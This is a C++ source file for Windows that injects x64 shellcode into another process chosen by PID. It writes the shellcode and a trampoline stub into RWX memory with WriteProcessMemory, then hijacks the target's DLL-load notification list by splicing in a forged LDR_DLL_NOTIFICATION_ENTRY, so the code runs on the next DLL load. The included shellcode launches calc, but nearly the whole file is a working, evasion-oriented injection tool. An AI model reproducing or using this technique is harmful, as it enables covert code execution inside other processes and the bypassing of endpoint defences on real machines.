

#include <iostream>
#include <Windows.h>
#include <cstdio>
#include "defs.h"

unsigned char hexData[] = {
	0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // movabs rax,0x4141414141414141
	0x48, 0x89, 0x00,											// mov    QWORD PTR [rax],rax
	0x48, 0x89, 0x40, 0x08,										// mov    QWORD PTR [rax+0x8],rax
	0x48, 0xb8, 0x51, 0x51, 0x51, 0x51, 0x51, 0x51, 0x51, 0x51,	// movabs rax,0x5151515151515151
	0xff, 0xe0,													// jmp rax
	0xC3														// ret
};

unsigned char shellcode[288] = { //shellcode to pop calc
	0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x68, 0x18, 0x48, 0x89, 0x70, 0x20, 0x57,
	0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x20, 0xC7, 0x40, 0x08, 0x63, 0x61, 0x6C, 0x63, 0x45,
	0x33, 0xC0, 0x44, 0x88, 0x40, 0x0C, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x48, 0x18, 0x4C, 0x8B, 0x79, 0x20, 0x4D, 0x8B, 0xDF, 0x4D, 0x8B, 0x4B, 0x20, 0x4D, 0x8B,
	0x1B, 0x4D, 0x85, 0xC9, 0x0F, 0x84, 0x88, 0x00, 0x00, 0x00, 0x49, 0x63, 0x41, 0x3C, 0x42, 0x8B,
	0x8C, 0x08, 0x88, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x74, 0x78, 0x4D, 0x8D, 0x14, 0x09, 0x41, 0x8B,
	0xF8, 0x41, 0x8B, 0x52, 0x0C, 0x49, 0x03, 0xD1, 0xEB, 0x14, 0xC1, 0xCF, 0x0D, 0x0F, 0xBE, 0xCB,
	0x80, 0xFB, 0x61, 0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xF8, 0x48, 0xFF, 0xC2, 0x8A, 0x1A,
	0x84, 0xDB, 0x75, 0xE6, 0x41, 0x8B, 0x52, 0x20, 0x41, 0x8B, 0xD8, 0x49, 0x03, 0xD1, 0x45, 0x39,
	0x42, 0x18, 0x76, 0x3E, 0x8B, 0x32, 0x41, 0x8B, 0xE8, 0x49, 0x03, 0xF1, 0xEB, 0x16, 0xC1, 0xCD,
	0x0D, 0x41, 0x0F, 0xBE, 0xCE, 0x41, 0x80, 0xFE, 0x61, 0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03,
	0xE8, 0x48, 0xFF, 0xC6, 0x44, 0x8A, 0x36, 0x45, 0x84, 0xF6, 0x75, 0xE2, 0x8D, 0x04, 0x2F, 0x3D,
	0x7F, 0xC0, 0xB4, 0x7B, 0x74, 0x16, 0xFF, 0xC3, 0x48, 0x83, 0xC2, 0x04, 0x41, 0x3B, 0x5A, 0x18,
	0x72, 0xC2, 0x4D, 0x3B, 0xDF, 0x74, 0x21, 0xE9, 0x5E, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4A, 0x24,
	0x49, 0x03, 0xC9, 0x8B, 0xD3, 0x44, 0x0F, 0xB7, 0x04, 0x51, 0x41, 0x8B, 0x4A, 0x1C, 0x49, 0x03,
	0xC9, 0x46, 0x8B, 0x04, 0x81, 0x4D, 0x03, 0xC1, 0xBA, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C,
	0x24, 0x40, 0x41, 0xFF, 0xD0, 0x48, 0x8B, 0x5C, 0x24, 0x48, 0x48, 0x8B, 0x6C, 0x24, 0x50, 0x48,
	0x8B, 0x74, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x20, 0x41, 0x5F, 0x41, 0x5E, 0x5F, 0xC3, 0xCC, 0xCC
};

void CALLBACK Dummy(ULONG NotificationReason, PCLDR_DLL_NOTIFICATION_DATA NotificationData, PVOID Context) {
}

PLDR_DLL_NOTIFICATION_ENTRY GetDllNotificationListHeaderAddr() {
	HMODULE hNtdll = GetModuleHandleA("ntdll");

	if (hNtdll == nullptr) {
		exit(1);
	}

	LdrRegisterDllNotificationFunc pLdrRegisterDllNotification = (LdrRegisterDllNotificationFunc)GetProcAddress(hNtdll, "LdrRegisterDllNotification");
	PLDR_DLL_NOTIFICATION_ENTRY entry = nullptr;
	NTSTATUS status = pLdrRegisterDllNotification(0, (PLDR_DLL_NOTIFICATION_FUNCTION)Dummy, nullptr, (LPVOID*)&entry);

	return (PLDR_DLL_NOTIFICATION_ENTRY)entry->List.Flink;
}

int main(int argc, char* argv[])
{
	int pid = atoi(argv[1]);

	PLDR_DLL_NOTIFICATION_ENTRY entry = GetDllNotificationListHeaderAddr();
	LDR_DLL_NOTIFICATION_ENTRY remoteEntry{ 0 };
	LDR_DLL_NOTIFICATION_ENTRY next{ 0 };

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	LPVOID lpRemoteStub = VirtualAllocEx(hProcess, nullptr, sizeof hexData, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID lpRemoteShellcode = VirtualAllocEx(hProcess, nullptr, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPVOID lpRemoteEntry = VirtualAllocEx(hProcess, nullptr, sizeof LDR_DLL_NOTIFICATION_ENTRY, MEM_COMMIT, PAGE_READWRITE);

	if (!lpRemoteShellcode || !lpRemoteEntry || !lpRemoteStub)
	{
		printf("Allocate remote memory failed");
		exit(2);
	}

	memcpy(hexData + 2, &entry, sizeof LPVOID);
	memcpy(hexData + 19, &lpRemoteShellcode, sizeof LPVOID);

	WriteProcessMemory(hProcess, lpRemoteShellcode, shellcode, sizeof shellcode, nullptr);
	WriteProcessMemory(hProcess, lpRemoteStub, hexData, sizeof hexData, nullptr);
	ReadProcessMemory(hProcess, entry, &remoteEntry, sizeof remoteEntry, nullptr);

	next.List.Flink = (PLIST_ENTRY)entry;
	next.List.Blink = (PLIST_ENTRY)entry;
	next.Callback = (PLDR_DLL_NOTIFICATION_FUNCTION)lpRemoteStub;
	remoteEntry.List.Flink = (PLIST_ENTRY)lpRemoteEntry;
	remoteEntry.List.Blink = (PLIST_ENTRY)lpRemoteEntry;

	WriteProcessMemory(hProcess, lpRemoteEntry, &next, sizeof LDR_DLL_NOTIFICATION_ENTRY, nullptr);
	WriteProcessMemory(hProcess, entry, &remoteEntry, sizeof LDR_DLL_NOTIFICATION_ENTRY, nullptr);

	return 0;
}
